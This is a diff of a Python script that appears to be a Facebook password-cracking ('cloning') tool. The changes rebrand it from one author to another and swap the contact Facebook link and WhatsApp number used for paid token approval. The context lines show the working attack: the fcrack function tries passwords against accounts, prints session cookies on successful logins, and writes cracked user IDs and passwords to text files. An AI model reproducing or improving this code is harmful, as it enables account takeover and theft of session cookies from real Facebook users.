@@ -1092,12 +1092,12 @@ logo = """
          \033[1;37m▓██ █▄ ░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
          \033[1;37m▒██▒ █▄░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░ 
          \033[1;37m▒ ▒▒ ▓▒ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
-         \033[1;37m░ ░▒ ▒░ ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░ \033[1;32m LPC\033[1;37m 
+         \033[1;37m░ ░▒ ▒░ ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░ \033[1;32m AMMAR\033[1;37m 
 --------------------------------------------------
-[•] AUTHOR     : \033[1;32mSANA\033[1;37m
+[•] AUTHOR     : \033[1;32mAMMAR\033[1;37m
 [•] STATUS     : \033[1;32mFREE\033[1;37m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;32m 1.0.1 \033[1;37m"RAMZAN MUBARAK!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1131,7 +1131,7 @@ def rehan():
 	print('[2] RANDOM BD CLONING')
 	print('[3] RANDOM CHOICE PASS CLONING')
 	print('[4] CONTACT WITH OWNER')
-	print('[0] EXIT')
+	print('[0] FILE CRACKING')
 	lines()
 	gh = input('[•] CHOOSE : ')
 	if gh =='1':
@@ -1141,7 +1141,7 @@ def rehan():
 	elif gh =='3':
 		chos()
 	elif gh =='4':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100012510726200')
+		os.system('xdg-open https://www.facebook.com/Father0fhackers?mibextid=ZbWKwL')
 	elif gh =='0':
 		print('[•] THANKS FOR USE ')
 		time.sleep(3)
@@ -1508,14 +1508,14 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[SANA-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\033[1;32m[AMMAR-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 open('LPC-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                # print('\033[1;33m[SANA-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                # print('\033[1;33m[AMMAR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                 open('LPC-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
@@ -1550,7 +1550,7 @@ def approval():
       print('\33[1;37m----------------------------------------------')
       print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
       input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923498410573?text='+tks),approval()
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+17862240224?text='+tks),approval()
       time.sleep(1)
       approval()
   except:
